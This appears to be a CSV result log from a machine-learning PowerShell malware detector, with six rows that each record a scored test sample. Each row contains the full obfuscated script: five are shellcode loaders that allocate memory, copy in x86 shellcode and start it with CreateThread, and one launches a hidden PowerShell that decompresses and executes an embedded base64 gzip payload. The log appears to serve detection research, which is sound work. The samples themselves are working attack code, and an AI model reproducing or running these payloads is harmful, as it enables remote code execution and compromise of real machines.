2026-07-13 17:24:18,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\853.ps1,custom-ps-ml,UNKNOWN,7fe23b64-2dab-4fa9-bead-ffff671adf35,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3180,1758.69," (((\""{72}{68}{24}{51}{3}{46}{20}{15}{66}{23}{49}{54}{61}{70}{35}{37}{4}{65}{62}{27}{44}{73}{40}{39}{50}{5}{56}{11}{64}{31}{28}{74}{10}{16}{69}{21}{6}{26}{33}{32}{48}{13}{36}{47}{7}{57}{9}{45}{1}{30}{0}{19}{25}{71}{43}{60}{58}{8}{55}{67}{17}{34}{63}{29}{14}{38}{75}{18}{42}{12}{53}{59}{41}{2}{52}{22}\""-f '0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd','x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x7','tr](dOix.ToInt3','Import(bESmsvcrt.dl','50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c','ac,','0x59,0x5a,0x','x68',',0xe5,0x','x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0x','0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x4','7,0x38,0xe0',' 0x1000){dOig = dOiz.L','ff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80','x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0x','erDefini','4,0x','53',',0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;dOig = 0x1000;if (dOiz.Le','5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,','tPtr memset(IntPtr dest, uint src, uint count);LB4;dOiw = Add-Type -memb',',0x61,',';;){Start-sleep 60};','e','t);[DllImport(bESkernel','0x40,0','51,0xff,0xe0,0x5f,0','0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1',',0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,',',0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0','5,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,',',0x7d,0xf8,0x3b',',0x73,0x32,0x5f,0x54,0x6','x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77',',0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,','0,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b',',0x6b,0x00,',',0x','ff,0x01,0xc3',',0x49,0x8b,0x34,0x8b,0x01','0x3a','-le (dOiz.Length-1);dOii++) {dOiw::memset([IntP','ngth -gt','x10,0',',0x5','e0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0','lbES)]public static extern In','0xff,0xd5,0x6a,0x05,0x68,0xbd,0x46,0xb6,0x29,0','8,0x4c,0x77,0x26,0x07,0x',' bESWin32bES -namespace Win',',0xd6,0x31,0xff,0x','32.dllbES)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[Dll','2()+dOii), dOiz[dOii], 1)};dOiw::CreateThread(0,0,dOix,0,0,0);for (','ength};dOix=dOiw::VirtualAlloc(0,0','32Functions -','ff,0xd5,0x93,0x53,0x6a,0x00,0','0xc1,0xcf,0x0d,0x01,0xc',',0x02,0','0x58,0xa4,0x53','x1000,dOig,0x40);for (dOii=0;dOii ','x00,0x00,0x56,0x6a,0x00,0x68,','passthru;[Byte[]];[Byte[]]dOiz = 0xfc,0xe8',',0x8b,0x52,0x10,0x8b,','0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40',',0x75,0xf6,0x03',',0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57','tion dOic -Nam','x56,0x','llbES)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtec','24,0x24,0x5b,0x5b',',0x82,0x0','x68,0x00,0','dOic = LB4[DllImport(bESkernel32.d','1,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,','0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,',',0x29,0xc6,0x75,0xc7,0xc3'))-rePLAcE 'LB4',[Char]39  -rePLAcE([Char]98+[Char]69+[Char]83),[Char]34-rePLAcE([Char]100+[Char]79+[Char]105),[Char]36)|InvOKe-ExprESSiON",malicious,TP
2026-07-13 17:24:22,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\870.ps1,custom-ps-ml,UNKNOWN,966b7129-5680-428a-9865-e5b78f70cf4f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3291,1547.19," iEX( (((\""{48}{22}{41}{29}{45}{50}{53}{26}{5}{8}{57}{19}{37}{20}{30}{76}{40}{34}{32}{13}{55}{14}{63}{17}{44}{0}{31}{78}{2}{75}{54}{15}{6}{43}{21}{27}{74}{11}{3}{42}{47}{71}{77}{70}{61}{64}{73}{16}{38}{62}{24}{4}{49}{51}{67}{18}{33}{7}{10}{46}{58}{56}{9}{36}{1}{12}{60}{39}{66}{35}{28}{59}{23}{72}{65}{68}{69}{25}{52}\"" -f'f,0x','x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,','x3b,0x7d,0x24,0x75,0xe','xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,','0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd','memset(IntPtr dest, uin','d','xff,0xd5,0x85,0xc','t src, uint coun','x00,0x00,0x40,0x00,0x5','0,0x75,0x0a,0x4f,0x75,0xd9,0',',0','0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0x','0x20,0xc1,0xc','0x52,0x10','58,0x24,0x01,0x','0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00','x31,0xff,0xac,0xc1,','86','ition I6Dc -Name 0daWin32','00,0x00,0x00,0x60,0x89,0xe5,0x','6,0x8b,0x0c,0x4b','Dc = gJ2[DllImport(0dakernel32.dll0da)]public','0x70,0x73,0x65,0x63,0x2e,0x69,0x6f,0x00;I6Dsize = 0x1000;if (I6Dsc.Length -gt 0x1000){I6Dsize = I6Dsc.Length};I6Dx=I6Dw::VirtualAlloc(0,0x1000,','x46,0x33,0x33,0x58,0x58,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,','6Di], 1)}','static extern IntPtr ',',0x8b,0x58','x35,0x2e,0x','llocationType, uint flProtect);[DllImport(0dakern','31,0xc0,0x','0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0','0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,',',0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0','0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,','f,0xe8,0x75,0xff,0xff,0xff,0x68,0x6f,0x73,0x74,0x2d,0x31,0x31,0','3,0x68,0','0da -namespace Win32Functions -passthru;[Byte[]];[Byte[]]I6Dsc = 0xfc,0xe8,0x82,0x',',0x00,0xe8,0','d5,0x85,0xc0,0x74,0xcd,0x8b,0x07','0,0x8b,0x52,0x0c,',' static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flA','0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d','3,0x6','0xc','el32.dll0da)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint ','x68,0xf0,0xb5,0xa2,0x',',0x5d,0x68,0x6e,0x65,0x74,0x00,0x68','I6','5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00','dwStackSize, In',',',';I6Dw::CreateThread(0,0,I6Dx,0,0,0);for (;;){Start-sleep 60};','tPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(0damsvcrt.dll0da)]public ','58,0x8b,0x','f,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,','6,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0','t);gJ2;I6Dw = Add-Type -memberDefin','5','69,','ff,0x','0xff,0xd5,0x','x8c,0x00,0x00,0x00,0x2f,0',',0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0','31,0xdb,0x53,0x53,0x53,0x','Dsiz',',0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5','0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x','e,0x40);for (I6Di=0;I6Di -le (I6Dsc.Length-1);I6Di++) {I6Dw::memset([IntPtr](I6D','x.ToInt32()+I6Di), I6Dsc[I',',0x26,0x07,',',0x77,0x69,0x6','I6','53,0x53,0x68,0x3a,',',0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01','4,0x','64,0x8b,0x50,0x3','e,0x69,0x54,0x68,0x4c,0x77','x03,0x7d,0xf8,0'))  -cREPLace  '0da',[cHAr]34 -cREPLace  ([cHAr]73+[cHAr]54+[cHAr]68),[cHAr]36 -cREPLace ([cHAr]103+[cHAr]74+[cHAr]50),[cHAr]39))",malicious,TP
2026-07-13 17:24:27,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\879.ps1,custom-ps-ml,UNKNOWN,4b0c05ad-ede8-47a9-bc61-c79588009b90,DESKTOP-BAC9DBQ,malicious,0.9783,RandomForest,3174,1663.06,"&amp;((gEt-vArIaBLE '*mdR*').NaME[3,11,2]-jOin'') ((((\""{48}{43}{16}{32}{74}{52}{45}{55}{29}{47}{3}{31}{57}{10}{38}{27}{4}{1}{37}{67}{20}{2}{28}{49}{54}{5}{24}{68}{56}{17}{46}{34}{30}{60}{36}{23}{19}{69}{72}{14}{51}{73}{75}{40}{7}{6}{33}{71}{44}{59}{13}{53}{66}{25}{8}{50}{0}{70}{12}{39}{65}{63}{58}{64}{21}{61}{41}{18}{35}{15}{62}{42}{26}{11}{9}{22}\"" -f'e,0','0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,','c,0x3c','ort(v86msv','x8b,','10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x5','0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0',',0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,',',0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x5','for (;','tr memset(IntPtr dest, uint ','GSoi), GSoz[GSoi], 1)};GSow::CreateThread(0,0,GSox,0,0,0);','0',',0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x','0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x8d,0xff,0x9b,','(GSoi=0;GSoi -le (GSoz.Length-','lic static extern IntPtr VirtualAllo','b,0x34,0x8b,0x01,0xd','GSow:',',0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,','0x0f,0xb7,0x4a,0x26,0x31,0xff,0xa',',0x6a,0x00,0x53,0xff,0xd5;GSog = 0x1000;if ',';){Start-sleep 60};',',0x5f','1,0x8b,0x59,0x20,0x01,0xd3,0','00,0x40,0x00,0x00,0x6a','r](GSox.ToInt32()+',',0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0',',0x61,0x7c,0x02,0x2','utes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[Dll','0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x5','c','c(IntPtr lpAd','x61,0x00,0x0','58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,',':VirtualAlloc(0,0x1000,GSog,0x40);for ',',0x32,0x00,0x00,0x68,0x77,0x73,0x32','0x72,0x28','src, uint count);OiD;GSow = Add-Type -memberDefinition GSoc -Name v86Win32v86 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]GSoz = 0xfc,0xe8','xf','x0f,0xdf,0xe0','.Length};GSox=','GSow::memset([IntPt','6kernel32.dllv86)]pub','00,0x6a,0x0','t flProtect);[DllImport(v86kernel32.dllv86)]public static extern In','6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x','Imp','GSoc = OiD[DllImport(v8','c,0x20,0xc1,0xc','7,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5','0x08,',' uin','00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0','f,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x','tPtr CreateThread(IntPtr lpThreadAttrib','49,0x18,0xe3,0x3a,0x49,0x8','rt.dllv86)]public static extern IntP','b5,','4,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36','9,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33','(GSoz.Length -gt 0x1000){GSog = GSoz','1);GSoi++) {','0xc7,0xc3,0xbb,0xf0,0x','0xa2,0x56','f,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,','x',',','x8b,0x','0x29,0xc4,0','xff,0x0c,0x24,0xe9,0x71,','0,0x00,0x6a,0x','x54,0x50,0x68,0x29,','0x68,0x02,0x00,0x01,0xbb,0x89,0x','dress, uint dwSize, uint flAllocationType,','e6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0'))  -REPlaCE 'OiD',[cHaR]39  -cREpLACE  'v86',[cHaR]34 -REPlaCE  'GSo',[cHaR]36) )",malicious,TP
2026-07-13 17:24:32,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\887.ps1,custom-ps-ml,UNKNOWN,d963492e-b738-4995-a3f0-0deb1b7c060b,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2841,1601.95," (((\""{10}{16}{19}{20}{3}{36}{24}{17}{26}{23}{41}{44}{34}{14}{4}{35}{25}{18}{5}{22}{27}{45}{30}{43}{12}{37}{11}{21}{32}{38}{8}{31}{47}{42}{40}{0}{28}{7}{9}{33}{15}{39}{1}{6}{29}{2}{13}{46}\"" -f'0x68,0x02,0xd9,0xc','{8TPg = 8TPz.Length};8TPx=8TPw::VirtualAlloc','i -le (8TPz.Length-1);8TPi++) {8TPw::memset([I','tionType, uint flProtect);[DllImport(o3ckernel32.dllo3c)]public static extern IntPtr CreateThread(IntPtr lpThreadAttribute','Pz = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,','0x61,0x7c,0x','(0,0x1000,8TP','68,0x00,0x10','x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,',',0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0','8TPc = uor[DllImport(o3ckernel32.dllo3c)]public static extern IntPtr V','8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x5','x61,0','ntPtr](8TPx.ToInt32()+8','Win32o3c -namespace Win32Functions -passthru;[Byte[]];[Byte[]]8T','xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;8TPg = 0x1000;if (8TPz.Length','irtualAllo','Address, IntPtr lpParameter, uint dwCreation',',0x26,0x31,0xff,0xac,0x3c,','c(IntPtr lpA','ddress, uint dwSize, uint flAlloca','4,0x68,0x4c,','0',', I','ize, IntPtr lpStart','0x28,0x0f,0xb7,0x4a','Flags','2,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x0','8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x','g,0x40);for (8TPi=0;8TP','7d,0xf8,0x3b,0x7d,0x24,0x75,0x','0xff,0xd5,0x85,0xc0,0x74,0x0a','0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xf','x5f,0xff,0xd5,0x83,0','t count);uor;8TPw = Add-Type -memberDefinition 8TPc -Name o3c','0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,','s, uint dwStackS','x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x','f,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x6a,0x9c,0xd9,0x68,0x02,0x00,0x01,0xbb,0',' -gt 0x1000)',',0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,','ntPtr lpThreadId);','75','e4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0','[DllImport(o3cmsvcrt.dllo3c)]public static extern IntPtr memset(IntPtr dest, uint src, uin','1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x','TPi), 8TPz[8TPi], 1)};8TPw::CreateThread(0,0,8TPx,0,0,0);for (;;){Start-sleep 60};',',0xff,0x4e,0x08,0x')) -CREPLAcE 'o3c',[CHAR]34 -CREPLAcE  ([CHAR]117+[CHAR]111+[CHAR]114),[CHAR]39  -REplace([CHAR]56+[CHAR]84+[CHAR]80),[CHAR]36) |&amp; ( $PSHOME[21]+$PshoMe[34]+'x')",malicious,TP
2026-07-13 17:24:37,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\891.ps1,custom-ps-ml,UNKNOWN,3db4b605-df19-454c-96da-ca6c5e4bd773,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2783,1490.56,"(((\""{45}{31}{7}{4}{10}{30}{46}{15}{0}{39}{37}{32}{25}{20}{38}{8}{34}{6}{29}{42}{28}{14}{35}{26}{1}{41}{17}{2}{21}{13}{9}{12}{40}{19}{3}{16}{24}{18}{22}{33}{44}{5}{23}{27}{11}{36}{43}\""-f 'TX)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);qda;CEYw = Add-Type -memberDefinition ',',0x58,0x5f,','26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29','0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0','nt dwStackSize, IntPt','c8,0x5f,0xf',',0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c','rn IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(YTXkernel32.dllYTX)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, ui','00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14','xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa','r lpStartAddress, IntPtr lpParameter, uint dw','c.Length};CEYx=CEYw::VirtualAl','8,0x00,0x6d,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10','0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0',',0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3','ort(YTXmsvcrt.dllY','x8b,0x36,0x6a,',',0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x','40,0x68,0x00,0x10,','9,0xa5,0x74,0x61,0xff,0xd5,0x85,','in32Functi',',0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,','0x00,0x00,0x56,0x6a,0x','f,0xd5,0x01','0x','W',',0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0',',0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;CEYsize = 0x1000;if (CEYsc.Length -gt 0x1000){CEYsize = CEYs',',0xe0,0x75,0xf4,0x03,0x7d,0xf8',',0x49,0','CreationFlags, ','[DllImport(YTXkernel32.dllYTX)]public static exte','-namespace ','00,0x68,0x58',',0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c',',0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44','loc(0,0x1000,CEYsize,0x40);for (CEYi','Name YTXWin32YTX ','ons -passthru;[Byte[]];[Byte[]]CEYsc = 0xfc,0xe8,0x89,0x00,0x','CEYc -',',0x56,0x57,0x68,0x9','0x5a','x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38','=0;CEYi -le (CEYsc.Length-1);CEYi++) {CEYw::memset([IntPtr](CEYx.ToInt32()+CEYi), CEYsc[CEYi], 1)};CEYw::CreateThread(0,0,CEYx,0,0,0);for (;;){Start-sleep 60};',',0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0x','CEYc = qda','IntPtr lpThreadId);[DllImp'))  -cReplace ([ChAr]67+[ChAr]69+[ChAr]89),[ChAr]36  -cReplace 'YTX',[ChAr]34  -cReplace 'qda',[ChAr]39) |&amp; ((gv '*MDR*').NAme[3,11,2]-jOin'')",malicious,TP
2026-07-13 17:24:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\991.ps1,custom-ps-ml,UNKNOWN,6c5a96d7-96f4-4117-b3ae-8f5cd6b5b630,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2910,1554.21," &amp; ( $SHELlID[1]+$sHellID[13]+'X')( ((\""{37}{5}{35}{26}{15}{17}{48}{27}{1}{46}{10}{31}{33}{32}{0}{29}{42}{12}{20}{6}{16}{41}{38}{13}{2}{23}{47}{19}{22}{7}{3}{25}{39}{36}{8}{9}{43}{45}{40}{34}{18}{21}{4}{24}{28}{30}{11}{14}{44}\""-f'rwAy5k3l4gn1jHtqP+gykDCcNjm1N3Am6HSKVW1YHJRFS7dux4+m3hlYlHA1LeBHhBnURb6mshIB4ju/NmE7M24FPThwnilgkjPpYxoRll/LNbZUH','M1hi/x','iZ2isE/c9','tdefXVXk/tBnuebo/yF9ium6KmZ3nrW0dodr0zNlee3Zt2nI3Q1O/7BfnqIJQKajYVYM3hoZAHd3Gvs0fG77IFXw4awNTMur2qka3WzVQrzZ7KF/qPvgO8NTo2wU6','t IO.StreamReader(New-Object IO.Compression.GzipStream(BZls,[IO.Compression.Compressio','3powershell.exe2jU};BZls=New-Object System.Diagnostics.ProcessStartInfo;BZls.FileName=BZlb;BZls.Arguments=2jU-nop -w hidden -c BZls=New-Object IO.MemoryStream(,[Convert]::FromB','ENLD','pgNrOQedsbylEdmXc0Nx8Wt8trurWayB2u9U9bY/uYM9bbme96w7Ln+ReedZs/r9Jmv9Q1cgXcLFeiZt94NHLFsEIfzS7','p9sD','dqGXS3dLx9N1/dEsN5xRfv355uJzs0/tBUc9Xbc/xCIBlaToQ51tL+qEONboKO5v3fktLMIpZqAHu','ykOEWaimrU0oySLrMpbWlB9avOHdZknUdIs6gofck9k+Dc4K2V4QYo+0YbUVaRE55W6Y1uA','Style=2jUHidden2jU;BZls.Cre','eJLvHfTBKlxgOw4z','wFI91rQshaR9cWSkQUY7XK8yrAPGX3I','ateNoWindow=BZltrue;BZlp=[System.Diagnostics.Process]::Start(','nEr9D1aFhK0SDIQ0TaRKO+ZlwiMQB/MqWk3ssRkYPGQ8JkDb/77XgBOyTXbbldYCeR73zpw599y59qLAkZQHipy718q39+9OOljghaKm/CY//','FIok3zXTz3BbEZP','0Q','jxbMxPXjBV0v92O7/bQ4pVLizFxuixtU/X8ZPWTzFF7uvzH6PPYPs7/Eci7zkoWfpl8O/Bbpv01BH1MJlhZcSIzsa+brTBxkdPS58RQk0Ih3eOJvv5tInrbhU+Qvbkz+0nUK','hYQbI6Y50dd/hHJ0YRyDKglyiJKaJNLY2MhY/ikX8e72JtcN4+RIGNvxIyRwUxV8YeCQfCpaUgBz6gf9hpYQPMN6wFqOMad59Ejz9Rb8e/SszssXbuN6ZuqivJ56','SiSClnIxiEcyIm1FQ','AAA=2jU2jU));IEX (New-Objec','qB7WW2an3DXN4urasovSqtRlo1OXrc','BtIE9nvNR5Tk3ByhBPibTE','nMode]::Decompress))).ReadToEnd();2jU','Wg5up9CvAoSGnivWXbLlwy6QVOMI+7dg45cKztQDm/JHZHxs87CA5wZHBthURw+Aa7isdh','ADWiTlgCA7VWa2/aSBT9','xbitfFHWMlssyX2AaTK6uSpEQJJD7frZGJApDsrhnlISqpnxX+lMiyOnN/Yw4UvmmpP7',';BZls.UseSh','lk68RUeYSgRwIYw','ellExecute=BZlfalse;BZls.RedirectStandardOutput=BZltrue;BZls.Window','k8BNERiJQns4UL7I3UdPQ7AjuINcVJASPbD1Y8TlRU0HEWEb5Qx0fENxGgaQLAvOSCL60iFhRh4RZEwcuI7fEm6ht8pgc/Fed1GMnsOpIoWUgOG9AbXE3YmTvndZ+Bvsiq','Pd1J2IiDZRxnEoxpOJkg','Bo8x4EFNn68f/f+nZdIAks+O5YEtE7GuzYBuGqHh3Rn90XJZZQWbAoOYg','m7+3LqYgzP/+vlKfLlR','ase64String(2jU2jUH4sI','RmaP9mo/iJbFvdDEKV+VtWc/bLnf75+2h','if([IntPtr]::Size -eq 4){BZlb=2jUpowershell.exe2jU}else{BZlb=BZlenv:windir+2jUZh3syswow64Zh3WindowsPowerShellZh3v1.0Zh','rCVxKGYxIxnFpC4xNhb1k+3Tr/JRwozRwIeVVhAPGIl5sGSsD','jM3/UKHNmsPcCoOdpUdT0/7BS','1OYw9V3VXqOREBYVDXoPIl4kaMcScuD7uLG0rTvmBMIEt70DwrvNrSlCdD7blkJENXVyNACanyrOFskwS+nGZy67NcD','UwaFMlptof6PzsG2JB6EUkQORBAru','ioIMLaSzD7GKnpetAiC+Br309DJDxQNEmsDyr','MiT','BZls);','NK1yUT1cxx','+xgtilhZ0qUUxS48VyTOziGl7WWjEo1/fVrWhuf5ifZ','uM4pN','H3Z6/XGWU1CIwzcv15lw7OQGjFHeat6S')).ReplaCe(([cHAR]90+[cHAR]104+[cHAR]51),'\\').ReplaCe('BZl',[STRING][cHAR]36).ReplaCe(([cHAR]50+[cHAR]106+[cHAR]85),[STRING][cHAR]39) )",malicious,TP
